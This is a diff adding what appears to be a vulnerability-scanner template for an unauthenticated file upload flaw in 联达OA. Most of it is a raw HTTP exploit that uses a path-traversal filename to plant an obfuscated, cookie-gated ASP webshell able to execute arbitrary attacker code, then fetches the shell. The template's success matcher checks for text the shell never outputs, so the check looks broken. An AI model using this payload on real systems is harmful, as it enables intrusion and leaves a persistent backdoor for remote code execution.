@@ -1,0 +1,84 @@
+id: PHPOA-OA-UpLoadFile-upload
+
+info:
+  name: 联达OA-UpLoadFile.aspx任意文件上传漏洞
+  author: linfeng7z
+  severity: critical
+  description: 联达OA-uploadLogo.aspx存在任意文件上传漏洞，未经身份认证的远程攻击者利用此漏洞可以上传恶意脚本，从而在系统上执行恶意代码。
+  metadata:
+    fofa-qeury: app="联达OA"
+    veified: true
+  tags: oa,phpoa,upload,intrusive
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}"
+
+http:
+  - raw:
+      - |
+        POST /FileManage/UpLoadFile.aspx HTTP/1.1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Type: multipart/form-data; boundary=00content0boundary00
+        Host: {{Hostname}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Connection: close
+        
+        --00content0boundary00
+        Content-Disposition: form-data; name="DesignId"
+        
+        1
+        --00content0boundary00
+        Content-Disposition: form-data; name="file"; filename="../{{file_name}}.asp"
+        Content-Type: image/png
+        
+        <%
+        Set A601D = Server.CreateObject("Scripting.Dictionary")
+        
+        Function B1Ryzz(content,isBin)
+            dim size,i,result,keySize
+            keySize = len(key)
+            Set C4pA = CreateObject("ADODB.Stream")
+            C4pA.CharSet = "iso-8859-1"
+            C4pA.Type = 2
+            C4pA.Open
+            if IsArray(content) then
+                size=UBound(content)+1
+                For i=1 To size
+                    C4pA.WriteText chrw(ascb(midb(content,i,1)))
+                Next
+            end if
+            C4pA.Position = 0
+            if isBin then
+                C4pA.Type = 1
+                B1Ryzz=C4pA.Read()
+            else
+                B1Ryzz=C4pA.ReadText()
+            end if
+        
+        End Function
+            content = request.BinaryRead(request.TotalBytes)
+            if len(request.Cookies.Item("mike@!3"))>0  then
+                if  IsEmpty(Session("loadQ13S")) then
+                    content=B1Ryzz(content,false)
+                    Session("loadQ13S")=content
+                    response.End
+                else
+                    A601D.Add "loadQ13S",Session("loadQ13S")
+                    Execute(A601D("loadQ13S"))
+                    result=run(content)
+                    if not IsEmpty(result) then
+                        response.BinaryWrite result
+                    end if
+                end if
+            end if
+        %>
+        --00content0boundary00--
+      - |
+        GET /FileManage/{{file_name}}.asp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && status_code_2 == 200 && contains(body_2, 'A Test')"
+        condition: and
